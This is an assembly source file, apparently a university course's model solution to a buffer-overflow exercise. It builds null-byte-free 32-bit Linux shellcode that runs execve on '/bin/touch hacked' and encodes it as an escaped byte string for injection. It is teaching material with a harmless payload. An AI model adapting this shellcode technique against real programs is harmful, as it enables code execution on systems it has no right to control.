; Musterlösung zu Aufgabe 14.1: Buffer-Overflow
; Erstellt von Florian Dittrich
;
; Lösung zu Schritt 3 für FASM
;
; Ausführen mit
;   fasm touch_hacked.asm
; Weitere Informationen unter
;   https://coconucos.cs.hhu.de/lehre/home/lectures/bsusp/k14a1/

format binary as 'h'
use32

db '"'

    xor   eax, eax      ; Statt "mov eax, 0"
    jmp   short data1

code1:
    mov   ebx, [esp+12] ; ebx zeigt jetzt auf filename
    xor   ecx, ecx      ; Offset 10 wird als LF in strlen interpretiert 
    mov   cl, 5         ; daher so umstaendlich
    add   cl, 5
    mov   [ebx+ecx], al ; Setzt das Nullbyte in filename
    mov   ecx, esp      ; argv liegt auf dem Stack
    mov   edx, [ecx]    ; edx zeigt jetzt auf argv0. "mov edx, [esp]" würde ein Nullbyte erzeugen
    mov   [edx+5], al   ; Setzt das Nullbyte in argv0
    mov   edx, [ecx+4]  ; edx zeigt jetzt auf argv1
    mov   [edx+6], al   ; Setzt das Nullbyte in argv1
    xor   edx, edx      ; Statt "mov edx, 0"
    mov   al, 11        ; syscall 11 (execve)
    int   0x80

data3:
    call  code1         ; Legt einen Zeiger auf argv0 auf den Stack
    argv0 db 'touch', '0'

data2:
    push  eax           ; Legt NULL auf den Stack
    call  data3         ; Legt einen Zeiger auf argv1 auf den Stack
    argv1 db 'hacked', '0'

data1:
    call data2          ; Legt einen Zeiger auf filename auf den Stack
    filename db '/bin/touch', '0'

groesse = $-1
    db groesse*3 dup 0
    db '";'

repeat groesse
    load char byte from groesse+1-%

    char1 = char shr 4 and $0F or '0'
    char2 = char and $0F or '0'

    if char1 > '9'
        char1 = char1 + 7
    end if
    if char2 > '9'
        char2 = char2 + 7
    end if

    store byte '\'   at (groesse-%)*4+1
    store byte 'x'   at (groesse-%)*4+2
    store byte char1 at (groesse-%)*4+3
    store byte char2 at (groesse-%)*4+4
end repeat